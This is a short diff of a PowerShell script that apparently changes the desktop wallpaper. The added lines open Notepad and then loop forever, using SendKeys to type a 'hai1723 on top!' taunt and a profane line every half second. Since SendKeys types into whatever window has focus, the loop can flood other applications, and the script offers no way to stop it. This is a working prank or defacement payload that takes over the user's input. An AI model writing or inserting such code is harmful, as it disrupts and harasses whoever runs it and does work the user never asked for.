@@ -93,3 +93,23 @@ public class Wallpaper {
 # Giải phóng tài nguyên
 $graphics.Dispose()
 $bmp.Dispose()
+
+# Mở Notepad
+Start-Process notepad
+Start-Sleep -Seconds 1
+
+# Lấy cửa sổ của Notepad để gửi phím
+$notepad = Get-Process | Where-Object {$_.MainWindowTitle -like "*Untitled - Notepad*"} 
+
+if ($notepad) {
+    # Đợi Notepad sẵn sàng
+    Start-Sleep -Seconds 1
+
+    # Gõ liên tục chuỗi "hai1723 on top!"
+    while ($true) {
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.SendKeys]::SendWait("hai1723 on top!{ENTER}avast shit!{ENTER}")
+        Start-Sleep -Milliseconds 500
+    }
+}
+
